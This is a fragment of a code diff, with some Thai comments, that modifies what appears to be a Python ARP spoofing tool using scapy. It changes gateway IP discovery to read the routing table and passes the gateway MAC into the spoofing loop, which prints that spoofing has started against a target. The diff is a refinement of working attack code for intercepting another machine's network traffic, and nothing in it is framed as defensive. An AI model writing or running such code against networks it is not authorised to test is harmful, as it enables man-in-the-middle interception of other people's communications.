@@ -18,7 +18,16 @@ _lock = threading.Lock()
 
 
 def _get_gateway_ip() -> str:
-    """Derive gateway IP from the local subnet (assumes .1)."""
+    """Get the default gateway IP using scapy's routing table."""
+    try:
+        from scapy.all import conf
+        gw = conf.route.route("0.0.0.0")[2]
+        if gw != "0.0.0.0":
+            return gw
+    except Exception:
+        pass
+        
+    # Fallback to .1 logic if routing table fails
     subnet = get_local_subnet()  # e.g. "192.168.11.0/24"
     prefix = subnet.rsplit(".", 1)[0]  # "192.168.11"
     return f"{prefix}.1"
@@ -85,15 +94,8 @@ def _get_local_mac() -> str:
     return get_if_hwaddr(conf.iface)
 
 
-def _spoof_loop(target_ip: str, target_mac: str, gateway_ip: str, stop_event: threading.Event):
+def _spoof_loop(target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str, stop_event: threading.Event):
     local_mac = _get_local_mac()
-    
-    # 👇 ดึง gateway MAC จริงก่อน
-    try:
-        gateway_mac = _get_gateway_mac(gateway_ip)
-    except RuntimeError:
-        print(f"❌ Cannot resolve gateway MAC")
-        return
 
     print(f"⚡ ARP spoofing started: {target_ip} ({target_mac})")
     print(f"🌐 Gateway: {gateway_ip} ({gateway_mac})")  # เพิ่ม log ตรงนี้
